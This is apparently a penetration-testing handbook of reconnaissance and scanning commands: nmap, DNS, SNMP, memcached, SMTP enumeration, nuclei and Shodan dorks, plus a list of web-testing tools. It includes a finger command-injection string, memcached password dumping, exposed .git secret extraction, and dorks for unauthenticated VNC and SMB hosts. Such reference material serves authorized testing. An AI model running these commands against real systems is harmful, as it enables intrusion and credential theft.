# Cybersecurity-Handbooks

# Information Gathering

- [Resources](#resources)

## Table of Contents

- [Amass](#amass)
- [Banner Grabbing](#banner-grabbing)
- [Common Ports](#common-ports)
- [dmitry](#dmitry)
- [DMARC](#dmarc)
- [DNS](#dns)
- [dnsenum](#dnsenum)
- [dnsrecon](#dnsrecon)
- [Enyx](#enyx)
- [finger](#finger)
- [MASSCAN](#masscan)
- [memcached](#memcached)
- [Naabu](#naabu)
- [netdiscover](#netdiscover)
- [NetBIOS](#netbios)
- [Nmap](#nmap)
- [onesixtyone](#onesixtyone)
- [Outlook Web Access (OWA)](#outlook-web-access-owa)
- [Port Scanning](#port-scanning)
- [SMTP](#stmp)
- [SNMP](#snmp)
- [snmp-check](#snmp-check)
- [SNMP-MIBS-Downloader](#snmp-mibs-downloader)
- [snmpwalk](#snmpwalk)
- [SPF](#spf)
- [sslscan](#sslscan)
- [sslyze](#sslyze)
- [subfinder](#subfinder)
- [tcpdump](#tcpdump)
- [Time To Live (TTL) and TCP Window Size Values](#time-to-live-ttl-and-tcp-window-size-values)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| Amass | The OWASP Amass Project performs network mapping of attack surfaces and external asset discovery using open source information gathering and active reconnaissance techniques. | https://github.com/OWASP/Amass |
| ASNLookup | Quickly look up updated information about specific ASN, Organization or registered IP addresses (IPv4 and IPv6) among other relevant data. | https://asnlookup.com |
| ASNmap | Go CLI and Library for quickly mapping organization network ranges using ASN information. | https://github.com/projectdiscovery/asnmap |
| BashScan | BashScan is a port scanner built to utilize /dev/tcp for network and service discovery on systems that have limitations or are otherwise unable to use alternative scanning solutions such as nmap. | https://github.com/astryzia/BashScan |
| Censys | Attack Surface Management | https://search.censys.io |
| crt.sh | Certificate Search | https://crt.sh |
| crt.sh CLI | Certificate Search | https://github.com/az7rb/crt.sh |
| CTFR | CTFR does not use neither dictionary attack nor brute-force, it just abuses of Certificate Transparency logs. | https://github.com/UnaPibaGeek/ctfr |
| DNSdumpster | DNSdumpster.com is a FREE domain research tool that can discover hosts related to a domain. | https://dnsdumpster.com |
| dnsx | dnsx is a fast and multi-purpose DNS toolkit allow to run multiple probes using retryabledns library, that allows you to perform multiple DNS queries of your choice with a list of user supplied resolvers, additionally supports DNS wildcard filtering like shuffledns. | https://github.com/projectdiscovery/dnsx |
| Driftnet | Exposure Analysis | https://driftnet.io |
| Hardenize | Network Perimeter Monitoring | https://www.hardenize.com |
| IPinfo | Accurate IP address data that keeps pace with secure, specific, and forward-looking use cases. | https://ipinfo.io |
| Jackdaw | Jackdaw is here to collect all information in your domain, store it in a SQL database and show you nice graphs on how your domain objects interact with each-other an how a potential attacker may exploit these interactions. | https://github.com/skelsec/jackdaw |
| katana | A next-generation crawling and spidering framework. | https://github.com/projectdiscovery/katana |
| Knock Subdomain Scan | Knockpy is a python3 tool designed to quickly enumerate subdomains on a target domain through dictionary attack. | https://github.com/guelfoweb/knock |
| Minimalistic Offensive Security Tools | Minimalistic TCP and UDP port scanners. | https://github.com/InfosecMatter/Minimalistic-offensive-security-tools |
| naabu | Naabu is a port scanning tool written in Go that allows you to enumerate valid ports for hosts in a fast and reliable manner. | https://github.com/projectdiscovery/naabu |
| Nmap | Network Scanner | https://github.com/nmap/nmap |
| proxify | Swiss Army Knife Proxy for rapid deployments. | https://github.com/projectdiscovery/proxify |
| reconFTW | Reconnaissance Automation | https://github.com/six2dez/reconftw |
| Spoofy | Spoofy is a program that checks if a list of domains can be spoofed based on SPF and DMARC records. | https://github.com/MattKeeley/Spoofy |
| subfinder | Fast passive subdomain enumeration tool. | https://github.com/projectdiscovery/subfinder |
| wtfis | Passive hostname, domain and IP lookup tool for non-robots | https://github.com/pirxthepilot/wtfis |

## Amass

> https://github.com/OWASP/Amass

```c
$ amass enum -d <DOMAIN>
$ amass intel --asn <ASN>
$ amass intel --asn <ASN> -list
$ amass enum -active -d <DOMAIN> -p 80,443,8080
```

## Banner Grabbing

> https://book.hacktricks.xyz/pentesting/pentesting-imap#banner-grabbing

```c
$ nc -v <RHOST> 80
$ telnet <RHOST> 80
$ curl -vX <RHOST>
```

## Common Ports

| Port | Service |
| --- | --- |
| 21/TCP | FTP |
| 22/TCP | SSH |
| 25/TCP | SMTP |
| 53/TCP | DNS |
| 53/UDP | DNS |
| 80/TCP | HTTP |
| 135/TCP | RPC |
| 139/TCP | Netbios |
| 443/TCP | HTTPS |
| 445/TCP | SMB |
| 1723/TCP | VPN |
| 3389/TCP | RDP |
| 5985/TCP | WinRM |

### Domain Controller specific Ports

| Port | Service |
| --- | --- |
| 88/TCP | Kerberos |
| 389/TCP | LDAP |
| 636/TCP | LDAPS |
| 445/TCP | SMB |

## dmitry

```c
$ dmitry -p <RHOST>
```

## DMARC

```c
$ dig txt _dmarc.<DOMAIN> | grep dmarc
```

## DNS

```c
$ whois <DOMAIN>
$ dig @<RHOST> -x <DOMAIN>
$ dig {a|txt|ns|mx} <DOMAIN>
$ dig {a|txt|ns|mx} <DOMAIN> @ns1.<DOMAIN>
$ dig axfr @<RHOST> <DOMAIN>    // zone transfer - needs 53/TCP
$ host -t {a|txt|ns|mx} <DOMAIN>
$ host -a <DOMAIN>
$ host -l <DOMAIN> ns1.<DOMAIN>
$ nslookup -> set type=any -> ls -d <DOMAIN>
$ for sub in $(cat subDOMAINs.txt);do host $sub.<DOMAIN:|grep "has.address";done
```

## dnsenum

```c
$ dnsenum <DOMAIN>
$ dnsenum --threads 64 --dnsserver <RHOST> -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt <DOMAIN>
```

## dnsrecon

```c
$ sudo vi /etc/hosts
$ dnsrecon -r 127.0.0.0/24 -n <RHOST>
$ dnsrecon -r 127.0.1.0/24 -n <RHOST>
$ dnsrecon -d <DOMAIN> -t axfr @ns2.<DOMAIN>
```

## Enyx

> https://github.com/trickster0/Enyx

### Grabbing IPv6 Address

```c
$ python enyx.py 2c public <RHOST>
```

## finger

### finger Port 79/TCP

```c
$ finger root@<RHOST>
$ finger "|/bin/id@<RHOST>"

msf6 > use auxiliary/scanner/finger/finger_users
```

> https://github.com/pentestmonkey/finger-user-enum

```c
$ ./finger-user-enum.pl -U users.txt -t <RHOST>
```

## MASSCAN

> https://github.com/robertdavidgraham/masscan

```c
$ sudo masscan -e tun0 -p0-65535 --max-rate 500 --interactive <RHOST>
```

## memcached

>  https://github.com/pd4d10/memcached-cli

```c
memcrashed / 11211/UDP

$ npm install -g memcached-cli
$ memcached-cli <USERNAME>:<PASSWORD>@<RHOST>:11211
$ echo -en "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n" | nc -q1 -u 127.0.0.1 11211

STAT pid 21357
STAT uptime 41557034
STAT time 1519734962

$ sudo nmap <RHOST> -p 11211 -sU -sS --script memcached-info

$ stats items
$ stats cachedump 1 0
$ get link
$ get file
$ get user
$ get passwd
$ get account
$ get username
$ get password
```

## Naabu

```c
$ sudo naabu -p - -l /PATH/TO/FILE/<FILE> -o /PATH/TO/FILE/<FILE>
```

## netdiscover

```c
$ sudo netdiscover -i <INTERFACE> -r <RHOST>
```

## NetBIOS

```c
$ nbtscan <RHOST>
$ nmblookup -A <RHOST>
```

## Nmap

```c
$ nmap -A -T4 -p- -sS -sV -oN initial --script discovery <RHOST>
$ nmap -A -T4 -sC -sV --script vuln <RHOST>
$ nmap -sV --script http-trace <RHOST>
$ nmap -sV --script ssl-cert -p 443 <RHOST>
$ nmap -sV --script ssl-enum-ciphers -p 443 <RHOST>
$ nmap -A -T4 -p- <RHOST>
$ nmap -A -T4 -sS -sU -v <RHOST>
$ nmap -sC -sV -oN initial --script discovery <RHOST>
$ nmap -sC -sV -oA nmap <RHOST>
$ nmap -sS -sV <RHOST>
$ nmap -p- <RHOST>                      // full port scan
$ nmap -sS <RHOST>                      // ping scan
$ nmap -sT <RHOST>                      // TCP scan
$ nmap -sU <RHOST>                      // UDP scan
$ nmap -PR -sN <RHOST>                  // ARP scan
$ nmap -PP -sn <RHOST>                  // ICMP timestamp discovery
$ nmap -PM -sn <RHOST>                  // ICMP address mask discovery
$ nmap -PE -sn <RHOST>                  // ICMP echo discovery
$ nmap -PU -sn <RHOST>                  // UDP ping discovery
$ nmap -PS <RPORT> <RHOST>              // TCP SYN ping discovery
$ nmap -PA <RPORT> <RHOST>              // TCP ACK ping discovery
$ sudo nmap -sS -f -p <RPORT> <RHOST>   // fragment packets for stealth
$ sudo nmap -sS -ff -p <RPORT> <RHOST>  // fragmets packets double times for stealth
$ nmap  --script safe -p 445 <RHOST>    // detailed scan on smb

-p1-65535               // ports
-p-                     // all ports
-sV                     // version detection
-sS                     // TCP SYN scan
-sT                     // TCP connect scan
-sU                     // UDP scan
-sX                     // Xmas scan (sets FIN, PSH, URG flags)
-sC                     // script scan
-T4                     // timing options
-PN                     // no ping
-oA                     // write to file (basename)
-oN                     // write to file (normal)
-sn                     // host discovery only
-6                      // IPv6
-n                      // no dns resolution
-O                      // OS detection
-A                      // aggressive scan
-D                      // Decoy scan
-f                      // fragment packets
-S                      // spoof src ip address
-g                      // spoof src port
-n                      // no DNS lookup
-R                      // Reverse DNS lookup
--mtu                   // set MTU size
--spoof-mac             // spoof mac address
--data-length <size>    // append random data
--scan-delay 5s         // delay
--max-retries 1         // set retry limit to speed the scan up
```

### Getting Script Locations

```c
$ ls -lh /usr/share/nmap/scripts/*ssh*
$ locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|version\|safe' | grep smb
```

### Converting Report

```c
$ xsltproc nmap.xml -o nmap.html
```

### Network Sweep Scan

```c
$ sudo nmap -sn <XXX.XXX.XXX>.1-253
$ sudo nmap -sS <XXX.XXX.XXX>.1-253
```

#### Enable Monitoring with iptables

```c
$ sudo iptables -I INPUT 1 -s <RHOST> -j ACCEPT
$ sudo iptables -I OUTPUT 1 -d <RHOST> -j ACCEPT
$ sudo iptables -Z
```

#### Check for Connections

```c
$ sudo iptables -vn -L
```

### Generate grepable Output for IP Addresses and Ports

```c
$ sudo nmap <XXX.XXX.XXX>.1-253 -oG <FILE>
$ sudo nmap -p <RPORT> <XXX.XXX.XXX>.1-253 -oG <FILE>
```

```c
$ grep Up <FILE> | cut -d " " -f 2
$ grep open <FILE> | cut -d " " -f2
```

#### Alternative

```c
$ sudo nmap -iL /PATH/TO/FILE/<FILE> -p- -oG /PATH/TO/FILE/<FILE> | awk -v OFS=':' '/open/ {for (i=4;i<=NF;i++) {split($i,a,"/"); if (a[2]=="open") print $2, a[1]}}' | sort | uniq > /PATH/TO/FILE/<FILE>
```

### ASN

```c
$ nmap --script targets-asn --script-args targets-asn.asn=<ASN>
```

### SMB

```c
$ nmap -sV --script=smb-enum-shares -p 445 <RHOST>
$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <RHOST>
```

### Port Knocking

```c
$ for x in 7000 8000 9000; do nmap -Pn –host_timeout 201 –max-retries 0 -p $x <RHOST>; done
```

### RPC

```c
$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <RHOST>
```

### Kerberos

```c
$ nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test' <RHOST>
```

### File transfer (PUT)

```c
$ nmap -p 80 <RHOST> --script http-put --script-args http-put.url='<RHOST>',http-put.file='<FILE>'
```

## onesixtyone

>  https://github.com/trailofbits/onesixtyone

### Basic Usage

```c
$ echo public > <FILE>
$ echo private >> <FILE>
$ echo manager >> <FILE>
```

```c
$ for ip in $(seq 1 254); do echo <XXX.XXX.XXX>.$ip; done > <FILE>
```

```c
$ onesixtyone -c <FILE> -i <FILE>
```

### Brute-Force Community Strings

```c
$ onesixtyone -i snmp-ips.txt -c community.txt
```

## Outlook Web Access (OWA)

```c
https://<RHOST>/sitemap.xml
```

## Port Scanning

```c
$ for p in {1..65535}; do nc -vn <RHOST> $p -w 1 -z & done 2> <FILE>.txt
```

> https://github.com/AlexRandomed/One-Liner-Bash-Scanner

```c
$ export ip=<RHOST>; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo The port $port is open || echo The Port $port is closed > /dev/null" 2>/dev/null || echo Connection Timeout > /dev/null; done
```

## SMTP

```c
telnet 10.10.10.77 25
Connected to 10.10.10.77.
Escape character is '^]'.
220 Mail Service ready
HELO foobar.com
250 Hello.
MAIL FROM: <foobar@contoso.local>
250 OK
RCPT TO: <barfoo@contoso.local>
250 OK
RCPT TO: <admin@contoso.local>
250 OK
RCPT TO: <foobar@contoso.local>
250 OK
RCPT TO: <foobar@contoso.localb>
250 OK

$ smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t <RHOST>
$ smtp-user-enum -M RCPT -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t <RHOST>
$ smtp-user-enum -M EXPN -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t <RHOST>
```

## SNMP

### SNMP Byte Calculation

```c
$ python3
Python 3.9.7 (default, Sep  3 2021, 06:18:44)
[GCC 10.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import binascii
>>> s='50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135'
>>> binascii.unhexlify(s.replace(' ',''))
b'P@ssw0rd@123!!123\x13\x91q\x81\x92"2Rbs\x03\x133CSs\x83\x94$4\x95\x05\x15Eu\x86\x16WGW\x98(8i\t\x19IY\x81\x03\x10a\x11\x11A\x15\x11\x91"\x121&\x13\x011\x13A5'
```

## snmp-check

```c
$ snmp-check <RHOST>
$ snmp-check -t <RHOST> -c public
```

## SNMP-MIBS-Downloader

>  https://github.com/codergs/SNMP-MIBS-Downloader

```c
$ sudo apt-get install snmp-mibs-downloader
```

### Comment out "mibs: line"

```c
$ sudo vi /etc/snmp/snmp.conf
```

## snmpwalk

### Common Commands

```c
$ snmpwalk -c public -v1 <RHOST>
$ snmpwalk -c internal -v2c <RHOST>
```

### Examples

#### Detailed Output

```c
$ snmpwalk -v2c -c public <RHOST> .1
```

#### Windows Hostname

```c
$ snmpwalk -c public -v1 <RHOST> .1.3.6.1.2.1.1.5
```

#### OS / User Details

```c
$ snmpwalk -v2c -c public <RHOST> nsExtendObjects
```

#### Windows User Enumeration

```c
$ snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.25
```

#### Windows Process Enumeration

```c
$ snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.25.4.2.1.2
```

#### Windows Share Information

```c
$ snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.27
$ snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.3.1.1
```

#### Installed Software

```c
$ snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.25.6.3.1.2
```

#### Network Addresses

```c
$ snmpwalk -v2c -c public <RHOST> 1.3.6.1.2.1.4.34.1.3
```

#### TCP Ports

```c
$ snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.6.13.1.3
```

## SPF

```c
$ dig txt <DOMAIN> | grep spf
```

## sslscan

```c
$ sslscan <RHOST>
```

## sslyze

```c
$ sslyze <RHOST>
```

## subfinder

```c
$ subfinder -dL /PATH/TO/FILE/<FILE>
$ subfinder -dL /PATH/TO/FILE/<FILE> -nW -ip -p /PATH/TO/FILE/<FILE>
```

### Scan for Top Routinely Exploited Vulnerabilities according to CISA

```c
$ subfinder -d <DOMAIN> -all -silent | httpx -silent | nuclei -rl 50 -c 15 -timeout 10 -tags cisa -vv 
```

## tcpdump

```c
$ tcpdump -envi <INTERFACE> host <RHOST> -s0 -w /PATH/TO/FILE/<FILE>.pcap
```

## Time To Live (TTL) and TCP Window Size Values

| Operating System | Time to Live | TCP Window Size |
| --- | --- | --- |
| Linux Kernel 2.4 and 2.6) | 64 | 5840 |
| Google Linux | 64 | 5720 |
| FreeBSD | 64 | 65535 |
| OpenBSD | 64 | 16384 |
| Windows 95 | 32 | 8192 |
| Windows 2000 | 128 | 16384 |
| Windows XP | 128 | 65535 |
| Windows 98, Vista and 7 (Server 2008) | 128 | 8192 |
| iOS 12.4 (Cisco Routers) | 255 | 8760 |
| AIX 4.3 | 64 | 16384 |







# Vulnerability Analysis

- [Resources](#resources)

## Table of Contents

- [Aquatone](#aquatone)
- [Legion](#legion)
- [nikto](#nikto)
- [Nuclei](#nuclei)
- [Shodan](#shodan)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| Aquatone | A Tool for Domain Flyovers | https://github.com/michenriksen/aquatone |
| Can I takeover XYZ | "Can I take over XYZ?" — a list of services and how to claim (sub)domains with dangling DNS records. | https://github.com/EdOverflow/can-i-take-over-xyz |
| EyeWitness  | EyeWitness is designed to take screenshots of websites, provide some server header info, and identify default credentials if possible. | https://github.com/RedSiege/EyeWitness |
| gowitness | gowitness - a golang, web screenshot utility using Chrome Headless | https://github.com/sensepost/gowitness |
| nikto | Nikto web server scanner | https://github.com/sullo/nikto |
| Nuclei | Fast and customizable vulnerability scanner based on simple YAML based DSL. | https://github.com/projectdiscovery/nuclei |
| Shodan | Shodan is the world's first search engine for Internet-connected devices. | https://shodan.io |
| Sparta | Network Infrastructure Penetration Testing Tool | https://github.com/SECFORCE/sparta |

## Aquatone

> https://github.com/michenriksen/aquatone

### Testing for Subdomain Takeover

```c
$ cat <FILE>.txt | aquatone
```

## Legion

> https://github.com/GoVanguard/legion/

```c
$ sudo legion
```

## nikto

> https://github.com/sullo/nikto

```c
$ nikto -h <RHOST>
$ nikto -host 127.0.0.1 -useproxy http://<RHOST>:3128
```

## Nuclei

> https://github.com/projectdiscovery/nuclei

### Scanning Target

```c
$ nuclei -target https://<DOMAIN> -t nuclei-templates
```

### Rate Limiting

```c
$ nuclei -target https://<DOMAIN> -t nuclei-templates -rate-limit 5
```

### Set HTTP Header

```c
$ nuclei -target https://<RHOST> -t nuclei-templates -header "User-Agent: Pentest" -header 'X-Red-Team: Assessment'
```

### Debugging Output

```c
$ nuclei -l /PATH/TO/FILE/<FILE> -t /PATH/TO/TEMPALTES/ -debug-req -rl 10
```

### CISA Vulnerability Scan

```c
$ nuclei -tags cisa -list /PATH/TO/FILE/<FILE>
```
### Finding Git-Secrets

```c
$ ./nuclei -u https://<DOMAIN> -t /PATH/TO/TEMPLATES/exposures/configs/git-config.yaml
$ ./gitdumper.sh https://<DOMAIN>/.git/ /PATH/TO/FOLDER
$ ./extractor.sh /PATH/TO/FOLDER /PATH/TO/FOLDER/<FILE>
$ ./trufflehog filesystem /PATH/TO/FOLDER/<FILE>
```

## Shodan

> https://help.shodan.io/command-line-interface/0-installation

### Initialising

```c
$ pip install shodan
$ shodan init <API_KEY>
```

### Searches

```c
$ shodan search 'ASN:AS<ASN>'
$ shodan search 'ASN:AS<ASN> has_vuln:true'
$ shodan search --fields ip_str,port,org,hostnames 'asn:<ASN>'
$ shodan search --fields ip_str,port,org,hostnames 'asn:<ASN> port:443'
$ shodan search --fields ip_str,port,org,hostnames 'asn:<ASN> vuln:cve-2021-40449'
$ shodan stats --facets ssl.version asn:<ASN> has_ssl:true http
$ shodan domain <DOMAIN>
$ shodan honeyscore <RHOST>
$ shodan count vuln:cve-2021-40449
$ shodan stats --facets vuln country:US                       // top 10 vulnerabilities in America
$ shodan search 'd-Link Internet Camera, 200 OK'              // d-link cameras
$ shodan search '230 login successful port:21'                // ftp access
$ shodan search 'product:MySQL'                               // mysql databases
$ shodan search 'port:9200 json'                              // elastic search
$ shodan search 'hacked-router-help-sos'                      // hacked routers
$ shodan search 'IPC$ all storage devices'                    // attached storages
$ shodan search '"authentication disabled" port:5900,5901'    // vnc servers without authentication
$ shodan search 'http.favicon.hash:81586312'                  // default jenkins installations
$ shodan search 'http.favicon.hash:-1028703177'               // TP-Link Routers
```

### Dorks

```c
hostname:<DOMAIN>
http.title:"title"
http.html:"/file"
html:"context"
server: "apache 2.2.3"
asn:AS<ASN>
http.status:200
http.favicon.hash:"<HASH>"
port:"23"
mysql port:"3306"
proftpd port:21
os:"Linux"
os"windows 7
country:"UK"
"city: London"
product:"nginx"
Server: SQ-WEBCAM
title:"xzeres wind"
title:"Directory listing for /"
Ssl.cert.subject.CN:"<DOMAIN>" -http.title:"Invalid URL" 200
geo:"51.5074, 0.1278"
port:5432 PostgreSQL
port:"25" product:"exim"
os:"Windows 10 Home 19041"
"port: 53" Recursion: Enabled
"MongoDB Server Information" port:27017 -authentication
"Set-Cookie: mongo-express=" "200 OK"
port:"9200" all:"elastic indices"
"220" "230 Login successful." port:21
port:"11211" product:"Memcached"
"X-Jenkins" "Set-Cookie: JSESSIONID" http.title:"Dashboard"
port:8291 os:"MikroTik RouterOS 6.45.9"
product:"Apache httpd" port:"80"
product:"Microsoft IIS httpd"
"port: 8080" product:"nginx"
ssl.cert.issuer.cn:example.com ssl.cert.subject.cn:example.com
ssl.cert.expired:true
"Server: yawcam" "Mime-Type: text/html"
port:5006,5007 product:mitsubishi
"Server: gSOAP/2.8" "Content-Length: 583"
"authentication disabled" "RFB 003.008"
"Authentication: disabled" port:445
"X-Plex-Protocol" "200 OK" port:32400
"220" "230 Login successful." port:21
"Serial Number:" "Built:" "Server: HP HTTP"
"SERVER: EPSON_Linux UPNP" "200 OK"
```

### Creating Alert

```c
$ shodan alert create <NAME> <XXX.XXX.XXX.XXX/XX> && shodan stream --alerts=all
```

### Parsing Script

```c
#!/bin/bash

input="hosts.txt"

while read -r line
do
 shodan host $line; sleep 3
done < "$input"
```

### API Calls

```c
$ curl -s https://api.shodan.io/api-info?key=<API_KEY> | jq
$ curl -s https://api.shodan.io/shodan/host/1.1.1.1?key=<API_KEY> | jq
```

### Shodan to Nuclei

```c
$ shodan search vuln:CVE-2021-26855 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | httprobe | nuclei -t /PATH/TO/TEMPLATES/CVE/2021/CVE-2021-26855.yaml
```

### Web Search

```c
<product> city:"<CITY>"
"Server: gws" hostname:"google"
cisco net:"216.219.143.0/24"
Apache city:"<CITY>" port:"8080" product:"Apache Tomcat/Coyote JSP engine"
```

### MQTT Search

```c
mqtt port:1883
```

### k8s Search

> https://help.shodan.io/command-line-interface/0-installation

```c
'http.html:/apis/apiextensions.k8s.io'
```

Browse: /api/v1/secrets

### Cobalt Strike Servers

```c
"HTTP/1.1 404 Not Found" "Content-Type: text/plain" "Content-Length: 0" "Date" -"Server" -"Connection" -"Expires" -"Access-Control" -"Set-Cookie" -"Content-Encoding" -"Charset"
```

### Metasploit

```c
ssl:"MetasploitSelfSignedCA" http.favicon.hash:"-127886975"
```

### Empire

```c
http.html_hash:"611100469"
```

### Responder

```c
"HTTP/1.1 401 Unauthorized" "Date: Wed, 12 Sep 2012 13:06:55 GMT"
```







# Web Application Analysis

- [Resources](#resources)

## Table of Contents

- [2FA Bypass Techniques](#2fa-bypass-techniques)
- [403 Bypass](#403-bypass)
- [Asset Discovery](#asset-discovery)
- [Burp Suite](#burp-suite)
- [Bypassing File Upload Restrictions](#bypassing-file-upload-restrictions)
- [cadaver](#cadaver)
- [Command Injection](#command-injection)
- [commix](#commix)
- [Common File Extensions](#common-file-extensions)
- [curl](#curl)
- [davtest](#davtest)
- [DirBuster](#dirbuster)
- [Directory Traversal Attack](#directory-traversal-attack)
- [dirsearch](#dirsearch)
- [DNS Smuggling](#dns-smuggling)
- [DS_Walk](#ds_walk)
- [Favicon](#favicon)
- [feroxbuster](#feroxbuster)
- [ffuf](#ffuf)
- [Flask-Unsign](#flask-unsign)
- [gf](#gf)
- [GitHub](#github)
- [GitTools](#gittools)
- [GIXY](#gixy)
- [Gobuster](#gobuster)
- [gron](#gron)
- [hakcheckurl](#hakcheckurl)
- [Hakrawler](#hakrawler)
- [Host Header Regex Bypass](#host-header-regex-bypass)
- [HTML Injection](#html-injection)
- [HTTP Request Methods](#http-request-methods)
- [HTTP Request Smuggling / HTTP Desync Attack](#http-request-smuggling--http-desync-attack)
- [httprobe](#httprobe)
- [httpx](#httpx)
- [Interactsh](#interactsh)
- [JavaScript](#javascript)
- [Jenkins](#jenkins)
- [jsleak](#jsleak)
- [JWT_Tool](#jwt_tool)
- [Kyubi](#kyubi)
- [Leaky Paths](#leaky-paths)
- [Local File Inclusion (LFI)](#local-file-inclusion-lfi)
- [Lodash](#lodash)
- [Log Poisoning](#log-poisoning)
- [Magic Bytes](#magic-bytes)
- [mitmproxy](#mitmproxy)
- [ngrok](#ngrok)
- [OpenSSL](#openssl)
- [PadBuster](#padbuster)
- [PDF PHP Inclusion](#pdf-php-inclusion)
- [PHP](#php)
- [Poison Null Byte](#poison-null-byte)
- [Remote File Inclusion (RFI)](#remote-file-inclusion-rfi)
- [Server-Side Request Forgery (SSRF)](#server-side-request-forgery-ssrf)
- [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
- [Subdomain Takeover](#subdomain-takeover)
- [Symfony](#symfony)
- [unfurl](#unfurl)
- [Upload Filter Bypass](#upload-filter-bypass)
- [Upload Vulnerabilities](#upload-vulnerabilities)
- [waybackurls](#waybackurls)
- [Web Log Poisoning](#web-log-poisoning)
- [Wfuzz](#wfuzz)
- [WhatWeb](#whatweb)
- [Wordpress](#wordpress)
- [WPScan](#wpscan)
- [XML External Entity (XXE)](#xml-external-entity-xxe)
- [XSRFProbe (Cross-Site Request Forgery / CSRF / XSRF)](#xsrfprobe-cross-site-request-forgery--csrf--xsrf)
- [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| AllThingsSSRF | This is a collection of writeups, cheatsheets, videos, related to SSRF in one single location. | https://github.com/jdonsec/AllThingsSSRF |
| anew | A tool for adding new lines to files, skipping duplicates. | https://github.com/tomnomnom/anew |
| Arjun | HTTP Parameter Discovery Suite | https://github.com/s0md3v/Arjun |
| Awesome API Security | A collection of awesome API Security tools and resources. | https://github.com/arainho/awesome-api-security |
| cariddi | Take a list of domains, crawl urls and scan for endpoints, secrets, api keys, file extensions, tokens and more. | https://github.com/edoardottt/cariddi |
| CipherScan | Cipherscan tests the ordering of the SSL/TLS ciphers on a given target, for all major versions of SSL and TLS. | https://github.com/mozilla/cipherscan |
| Client-Side Prototype Pollution | In this repository, I am trying to collect examples of libraries that are vulnerable to Prototype Pollution due to document.location parsing and useful script gadgets that can be used to demonstrate the impact. | https://github.com/BlackFan/client-side-prototype-pollution |
| Commix | Commix (short for [comm]and [i]njection e[x]ploiter) is an open source penetration testing tool. | https://github.com/commixproject/commix |
| cookie-monster | A utility for automating the testing and re-signing of Express.js cookie secrets. | https://github.com/DigitalInterruption/cookie-monster |
| DalFox | DalFox is an powerful open source XSS scanning tool and parameter analyzer and utility that fast the process of detecting and verify XSS flaws. | https://github.com/hahwul/dalfox |
| DOMXSS Wiki | The DOMXSS Wiki is a Knowledge Base for defining sources of attacker controlled inputs and sinks which potentially could introduce DOM Based XSS issues. | https://github.com/wisec/domxsswiki/wiki |
| DS_Walk | Python tool for enumerating directories and files on web servers that contain a publicly readable .ds_store file. | https://github.com/Keramas/DS_Walk |
| DumpsterDiver | DumpsterDiver is a tool, which can analyze big volumes of data in search of hardcoded secrets like keys (e.g. AWS Access Key, Azure Share Key or SSH keys) or passwords. | https://github.com/securing/DumpsterDiver |
| EarlyBird | EarlyBird is a sensitive data detection tool capable of scanning source code repositories for clear text password violations, PII, outdated cryptography methods, key files and more. | https://github.com/americanexpress/earlybird |
| ezXSS | ezXSS is an easy way for penetration testers and bug bounty hunters to test (blind) Cross Site Scripting. | https://github.com/ssl/ezXSS |
| feroxbuster | A simple, fast, recursive content discovery tool written in Rust. | https://github.com/epi052/feroxbuster |
| ffuf | A fast web fuzzer written in Go. | https://github.com/ffuf/ffuf |
| gf | A wrapper around grep, to help you grep for things | https://github.com/tomnomnom/gf |
| GitDorker | GitDorker is a tool that utilizes the GitHub Search API and an extensive list of GitHub dorks that I've compiled from various sources to provide an overview of sensitive information stored on github given a search query. | https://github.com/obheda12/GitDorker |
| GitTools | This repository contains three small python/bash scripts used for the Git research. | https://github.com/internetwache/GitTools |
| Gobuster | Gobuster is a tool used to brute-force URIs, DNS subdomains, Virtual Host names and open Amazon S3 buckets | https://github.com/OJ/gobuster |
| grayhatwarfare shorteners | Search Shortener Urls | https://shorteners.grayhatwarfare.com |
| gron | Make JSON greppable! | https://github.com/tomnomnom/gron |
| Hakrawler | Fast golang web crawler for gathering URLs and JavaScript file locations. | https://github.com/hakluke/hakrawler |
| haktrails | Golang client for querying SecurityTrails API data. | https://github.com/hakluke/haktrails |
| httpbin | A simple HTTP Request & Response Service. | https://httpbin.org/#/ |
| httprobe | Take a list of domains and probe for working HTTP and HTTPS servers | https://github.com/tomnomnom/httprobe |
| httpx | httpx is a fast and multi-purpose HTTP toolkit allow to run multiple probers using retryablehttp library, it is designed to maintain the result reliability with increased threads. | https://github.com/projectdiscovery/httpx |
| interact.sh | HTTP Request & Response Service | https://app.interactsh.com/#/ |
| ipsourcebypass | This Python script can be used to bypass IP source restrictions using HTTP headers. | https://github.com/p0dalirius/ipsourcebypass |
| Java-Deserialization-Cheat-Sheet | The cheat sheet about Java Deserialization vulnerabilities | https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet |
| JSFuck | JSFuck is an esoteric and educational programming style based on the atomic parts of JavaScript. It uses only six different characters to write and execute code. | http://www.jsfuck.com |
| JSFuck []()!+ | Write any JavaScript with 6 Characters: []()!+ | https://github.com/aemkei/jsfuck |
| jsleak | jsleak is a tool to find secret , paths or links in the source code during the recon. | https://github.com/channyein1337/jsleak |
